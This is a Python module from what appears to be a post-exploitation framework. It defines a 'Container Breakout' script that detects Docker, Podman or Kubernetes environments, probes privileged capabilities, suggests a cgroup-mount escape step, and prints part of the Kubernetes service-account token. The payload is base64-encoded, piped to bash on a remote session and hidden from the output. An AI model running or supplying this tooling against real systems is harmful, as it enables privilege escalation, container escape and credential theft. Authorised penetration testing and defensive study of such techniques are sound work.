"""Container breakout detector."""

from ..base import OperatorScript, ScriptResult


class ContainerBreakout(OperatorScript):
    """Multiple container escape technique detector."""
    
    name = "Container Breakout"
    description = "Detect container environment and breakout paths"
    category = "escalate"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] CONTAINER BREAKOUT DETECTOR"
echo "==============================="
echo ""

echo "[*] Container detection:"
[ -f /.dockerenv ] && echo "[!] Inside Docker container (/.dockerenv exists)"
grep -q docker /proc/1/cgroup 2>/dev/null && echo "[!] Docker cgroup detected"
[ -f /run/.containerenv ] && echo "[!] Inside Podman container"
cat /proc/1/mountinfo 2>/dev/null | grep -q "docker\\|lxc\\|kubepods" && echo "[!] Container mountinfo detected"
echo ""

echo "[*] Privileged container checks:"
capsh --print 2>/dev/null | grep cap_sys_admin >/dev/null && {
    echo "[!] CAP_SYS_ADMIN present - escape likely possible"
    echo "  Try: mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp"
}

fdisk -l 2>/dev/null | grep -q "Disk /dev" && {
    echo "[!] Can see host devices - privileged container"
    echo "[*] Accessible devices:"
    fdisk -l 2>/dev/null | grep "^Disk"
}
echo ""

echo "[*] Host filesystem mounts:"
mount | grep -E "^/dev/(sda|nvme|vda)" && echo "[!] Host filesystem mounted"
echo ""

echo "[*] Kubernetes service account:"
[ -d /var/run/secrets/kubernetes.io ] && {
    echo "[!] Kubernetes service account found"
    ls -la /var/run/secrets/kubernetes.io/serviceaccount/
    echo ""
    echo "Token: $(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 50)..."
}
echo ""

echo "[*] Process capabilities:"
cat /proc/self/status | grep ^Cap
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Checking container breakout paths...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="Container breakout check executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
